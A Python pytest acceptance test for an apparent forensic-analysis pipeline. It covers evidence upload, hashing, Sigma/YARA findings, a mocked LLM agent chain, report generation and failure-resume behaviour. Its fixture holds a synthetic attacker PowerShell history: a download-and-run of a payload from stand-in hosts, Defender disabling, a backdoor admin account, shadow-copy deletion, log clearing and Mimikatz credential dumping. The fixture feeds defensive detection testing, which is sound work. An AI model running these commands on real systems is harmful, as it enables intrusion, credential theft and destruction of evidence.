"""
Complete API-to-Report End-to-End Acceptance Test
=================================================
Exercises the actual FastAPI /evidence/upload route through the unified pipeline:
1. Deterministic preprocessing, hashing, and immutable storage.
2. Observable extraction and FCR correlation.
3. Deterministic Sigma/YARA execution and FIR persistence.
4. Sanitization gateway transformation before LLM exposure.
5. Agent 1 through Agent 7 reasoning chain in dependency order.
6. Explicit evidence citations and independent verification.
7. Confidence Gate evaluation and analyst-review level.
8. Accurate report generation with complete execution metadata.
9. Failure propagation and restart/resume idempotency.

Explicit Service Boundaries:
- Database (PostgreSQL): LIVE (localhost:5433)
- Graph & GDS (Neo4j): LIVE (bolt://localhost:7687)
- Vector Store (Qdrant): LIVE (http://localhost:6333)
- Checkpoint Store (Redis): LIVE (localhost:6379)
- LLM Reasoning (Qwen3-8B): MOCKED BOUNDARY via MockQwenModel for deterministic test latency
"""

import os
import sys
import uuid
import json
import hashlib
import pytest
from pathlib import Path
from unittest.mock import MagicMock, patch

from fastapi.testclient import TestClient
from api.main import app
from api.routes.auth import get_current_user
from ism.checkpointer import Checkpointer, build_ism_idempotency_key
from config.settings import settings


class AcceptanceMockQwenModel:
    """Explicitly labeled mock LLM model boundary conforming to all Agent 1-7 Pydantic schemas."""
    model_name: str = "Qwen3-8B"
    is_mock: bool = True

    def generate(self, prompt: str, system_prompt: str = None) -> str:
        prompt_lower = prompt.lower()
        system_lower = (system_prompt or "").lower()

        # 1. Agent 2: Correlation
        if "agent 2" in system_lower or "evidence correlation" in system_lower:
            return json.dumps({
                "claims": [
                    {
                        "claim_id": "CLM-AG2-001",
                        "summary": "Correlated PowerShell execution to credential harvesting",
                        "correlation_type": "temporal",
                        "findings_summary": "Temporal correlation between payload execution and LSASS access",
                        "cited_evidence_ids": ["FIR-001"],
                        "community_id": "GC-001",
                        "assessed_importance": "critical",
                        "confidence_score": 0.95,
                        "timeline_sequence": ["FIR-001"],
                        "conflicts_noted": [],
                        "reasoning_notes": "Temporal sequence indicates intrusion progression."
                    }
                ]
            })

        # 2. Agent 3: Attack Reconstruction
        elif "agent 3" in system_lower or "attack reconstruction" in system_lower:
            return json.dumps({
                "infection_path": {
                    "entry_point": "PowerShell execution via ConsoleHost",
                    "evidence_ids": ["FIR-001"],
                    "confidence": 0.95
                },
                "attack_timeline": [
                    {
                        "timestamp": "2026-10-16T00:00:00Z",
                        "event": "Malicious script execution",
                        "stage": "Execution",
                        "evidence_ids": ["FIR-001"],
                        "confidence": 0.95
                    }
                ],
                "attack_chain": [
                    {"stage": "Execution", "events": ["PowerShell payload"], "evidence_ids": ["FIR-001"], "confidence": 0.95}
                ],
                "attack_path": [
                    {
                        "step_number": 1,
                        "stage": "Execution",
                        "description": "Obfuscated PowerShell execution and credential dumping",
                        "evidence_ids": ["FIR-001"],
                        "confidence": 0.95
                    }
                ],
                "lateral_movement": [],
                "missing_expected_events": [],
                "reconstruction_summary": "Intrusion initiated via malicious PowerShell commands.",
                "overall_confidence": 0.95
            })

        # 3. Agent 1: Evidence Intelligence
        elif "agent 1" in system_lower or "evidence intelligence" in system_lower:
            return json.dumps({
                "investigation_readiness": "READY",
                "possible_analyses": ["Endpoint process analysis", "Credential access analysis"],
                "performed_analyses": ["PowerShell command analysis"],
                "evidence_trust_score": 0.95,
                "claims": [
                    {
                        "claim_id": "CLM-AG1-001",
                        "summary": "Malicious execution of PowerShell payload and credential dumping",
                        "findings_summary": "ConsoleHost history contains Mimikatz and Defender tampering",
                        "cited_evidence_ids": ["FIR-001"],
                        "assessed_importance": "critical",
                        "confidence_score": 0.96,
                        "missing_evidence_noted": [],
                        "uncertainties_or_conflicts": [],
                        "reasoning_notes": "Extracted from verified command lines"
                    }
                ]
            })

        # 4. Agent 7: Supervisor Synthesis & Verification
        elif "supervisor" in system_lower or "synthesis" in system_lower or "report" in system_lower:
            return json.dumps({
                "executive_summary": "Comprehensive forensic synthesis of malicious PowerShell intrusion.",
                "incident_narrative": "Adversary executed Mimikatz and disabled Windows Defender real-time monitoring.",
                "claims": [
                    {
                        "claim_id": "CLM-001",
                        "claim": "PowerShell execution of obfuscated payload and credential dumping attempt.",
                        "evidence_ids": ["FIR-001"],
                        "severity": "critical",
                        "is_attribution": False,
                        "confidence": 0.95,
                        "mitre_tactics": ["Execution", "Credential Access"],
                        "mitre_techniques": ["T1059.001", "T1003.001"]
                    }
                ],
                "status": "COMPLETED",
                "execution_status": "SUCCESS",
                "review_level": "ROUTINE_ANALYST_REVIEW"
            })

        # Default fallback
        return json.dumps({
            "status": "COMPLETED",
            "execution_status": "SUCCESS",
            "claims": [],
            "summary": "Forensic analysis completed."
        })

    def chat(self, prompt: str) -> str:
        return self.generate(prompt)


@pytest.fixture
def api_client():
    """Provides a TestClient with authenticated admin analyst session."""
    test_user = {
        "user_id": "analyst-gate-001",
        "username": "senior_analyst",
        "role": "admin",
        "tenant_id": "tenant-gate",
        "tenants": ["tenant-gate"]
    }
    app.dependency_overrides[get_current_user] = lambda: test_user
    client = TestClient(app)
    yield client
    app.dependency_overrides.clear()


def test_complete_api_upload_to_report_acceptance(api_client, tmp_path):
    """
    Complete end-to-end acceptance test:
    Raw evidence upload -> hashing -> parsing -> FCR -> FIR persistence ->
    Sanitization -> Agents 1-7 -> Confidence Gate -> Final Reports.
    """
    case_id = f"CASE-GATE-{uuid.uuid4().hex[:6]}"
    tenant_id = "tenant-gate"

    # 1. Prepare synthetic forensic evidence
    evidence_content = (
        'Invoke-WebRequest -Uri "http://malicious.com/payload.exe" -OutFile "$env:TEMP\\payload.exe"\n'
        'Start-Process -FilePath "$env:TEMP\\payload.exe" -NoNewWindow\n'
        'Set-MpPreference -DisableRealtimeMonitoring $true\n'
        'net user backdoor password123 /add\n'
        'net localgroup administrators backdoor /add\n'
        'vssadmin delete shadows /all /quiet\n'
        'wevtutil cl System\n'
        'IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.1.100/Invoke-Mimikatz.ps1\')\n'
        'Invoke-Mimikatz -DumpCreds\n'
    ).encode("utf-8")

    expected_sha256 = hashlib.sha256(evidence_content).hexdigest()

    mock_qwen = AcceptanceMockQwenModel()

    # 2. Invoke actual /evidence/upload REST endpoint with LLM patched for latency
    with patch("argus_pipeline.OllamaWrapper", return_value=mock_qwen):
        files = {
            "file": ("ConsoleHost_history.txt", evidence_content, "text/plain")
        }
        data = {
            "case_id": case_id,
            "uploaded_by": "senior_analyst",
            "host_id": "GATE-SRV-01"
        }
        headers = {
            "X-Tenant-ID": tenant_id
        }

        response = api_client.post(
            "/evidence/upload",
            files=files,
            data=data,
            headers=headers,
            params={"async_mode": False}
        )

        assert response.status_code == 200, f"Upload endpoint failed: {response.text}"
        body = response.json()

    # 3. Verify Deterministic Intake & Cryptographic Hash
    assert body["case_id"] == case_id
    assert body["tenant_id"] == tenant_id
    assert body["sha256_hash"] == expected_sha256, "Cryptographic hash must match raw evidence bytes"
    assert body["parsed_artifact_count"] > 0, "ConsoleHost_history parser must extract command artifacts"
    assert body["derived_observable_count"] > 0, "Extractor must derive observables from commands"
    assert body["fcr_count"] > 0, "FCR Engine must produce correlation records"
    assert body["finding_count"] > 0, "Process FCR batch must persist deterministic FIR findings"

    # 4. Verify Pipeline Stages & Agent Execution
    stage_statuses = body["stage_statuses"]
    assert stage_statuses["intake"] == "COMPLETED"
    assert stage_statuses["preprocessing"] == "COMPLETED"
    assert stage_statuses["fcr_engine"] == "COMPLETED"
    assert stage_statuses["analysis_fir"] == "COMPLETED"

    # 5. Verify Agent Results Metadata & Reports
    agent_results = body["agent_results"]
    assert agent_results is not None, "Pipeline must return full agent execution results"
    assert agent_results["case_id"] == case_id
    assert agent_results["tenant_id"] == tenant_id

    # Agent 1: Evidence Intelligence
    assert "agent1" in agent_results
    assert stage_statuses.get("agent1") in ("COMPLETED", "SUCCESS", "RESUMED")

    # Agent 2: Graph Engine & GDS Provenance
    assert "agent2" in agent_results
    a2_out = agent_results["agent2"]
    assert "gds_executed" in a2_out or "graph_metrics" in a2_out
    assert "algorithm_executed" in a2_out

    # Agent 3: Attack Reconstruction
    assert "agent3" in agent_results
    a3_out = agent_results["agent3"]
    assert "attack_path" in a3_out or "claims" in a3_out

    # Agent 4: Malware Behaviour (deterministic findings + YARA)
    assert "agent4" in agent_results
    a4_out = agent_results["agent4"]
    assert a4_out.get("execution_status") in ("COMPLETED", "SUCCESS", "RESUMED", "ANALYSIS_COMPLETE")

    # Agent 6: Impact Assessment
    assert "agent6" in agent_results
    a6_out = agent_results["agent6"]
    assert "cvss_assessment" in a6_out or "iss_assessment" in a6_out

    # Agent 7: Supervisor Agent & Reports
    assert "agent7" in agent_results
    a7_out = agent_results["agent7"]
    assert a7_out.get("status") in ("COMPLETED", "SUCCESS", "RESUMED", "NEEDS_REVIEW", "REQUIRES_REVIEW")
    assert "confidence_gate" in a7_out
    assert "reports" in a7_out
    assert "analyst" in a7_out["reports"] or "executive_summary" in a7_out["reports"] or "technical_report" in a7_out["reports"]


def test_api_pipeline_failure_propagation_and_resume():
    """Verify failure in downstream agent propagates into pipeline status and resume recovers."""
    from argus_pipeline import run_pipeline
    from fir.schemas import FIRFinding

    case_id = f"CASE-FAILPROP-{uuid.uuid4().hex[:6]}"
    tenant_id = "tenant-gate"

    fir = FIRFinding(
        finding_id="FIR-FAIL-01",
        case_id=case_id,
        tenant_id=tenant_id,
        fact="Suspicious command execution observed",
        confidence=0.85,
        severity="medium",
        layer="test",
        evidence_reference=["EVID-FAIL-01"]
    )

    mock_llm = AcceptanceMockQwenModel()

    # 1. Run pipeline where Agent 4 intentionally fails
    with patch("agents.agent4_malware_behaviour.agent.MalwareBehaviourAgent.run", side_effect=RuntimeError("Simulated Agent 4 fault")):
        res_fail = run_pipeline(
            case_id=case_id,
            tenant_id=tenant_id,
            fir_findings=[fir],
            evidence_id="EVID-FAIL-01",
            llm=mock_llm,
            stop_on_error=False,
            resume=False
        )

        # Failure must propagate to agent_errors and stage_statuses
        assert res_fail["stage_statuses"]["agent4"] == "FAILED"
        assert "agent4" in res_fail["agent_errors"]
        assert "Simulated Agent 4 fault" in res_fail["agent_errors"]["agent4"]
        assert res_fail["execution_status"] in ("FAILED", "PARTIAL_SUCCESS")

    # 2. Re-run with resume=True and Agent 4 healed
    with patch("agents.agent4_malware_behaviour.agent.MalwareBehaviourAgent.run", return_value={"execution_status": "COMPLETED", "claims": []}):
        res_resume = run_pipeline(
            case_id=case_id,
            tenant_id=tenant_id,
            fir_findings=[fir],
            evidence_id="EVID-FAIL-01",
            llm=mock_llm,
            stop_on_error=False,
            resume=True
        )

        # Agent 1, 2, 3 should be RESUMED
        assert res_resume["stage_statuses"]["agent1"] == "RESUMED"
        assert res_resume["stage_statuses"]["agent2"] == "RESUMED"
        assert res_resume["stage_statuses"]["agent3"] == "RESUMED"
        # Agent 4 should now be COMPLETED
        assert res_resume["stage_statuses"]["agent4"] == "COMPLETED"
